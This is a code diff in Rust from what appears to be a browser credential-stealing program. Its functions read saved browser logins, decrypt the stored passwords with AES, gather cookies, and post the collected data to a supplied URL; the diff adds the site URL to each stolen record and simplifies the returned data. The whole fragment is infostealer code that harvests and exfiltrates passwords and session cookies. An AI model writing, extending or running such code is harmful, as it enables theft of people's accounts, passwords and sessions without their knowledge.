@@ -38,6 +38,7 @@ pub fn get_login(
             let username = statement.read::<String>(1)?;
             let password = statement.read::<Vec<u8>>(2)?;
             let obj = json!({
+                "url": url,
                 "username": username,
                 "password": std::str::from_utf8(&crypto::aes_decrypt(&key, password))?
             });
@@ -55,10 +56,7 @@ pub fn get_login(
                 }
             }
         }
-        return Ok(json!({
-            "filename": "login",
-            "data": credentials
-        }));
+        return Ok(credentials);
     }
     Err(anyhow!(1))
 }
@@ -100,15 +98,12 @@ pub fn get_cookies(
                 }
             }
         }
-        return Ok(json!({
-            "filename": "cookies",
-            "data": cookies
-        }));
+        return Ok(cookies);
     }
     Err(anyhow!(1))
 }
 
-pub fn send_data(data: serde_json::Value, url: &str) -> Result<i32, anyhow::Error> {
+pub fn send_data(data: serde_json::Value, url: String) -> Result<i32, anyhow::Error> {
     let client = reqwest::blocking::Client::new();
     let url: reqwest::Url = url.parse()?;
     client.post(url).json(&data).send()?;
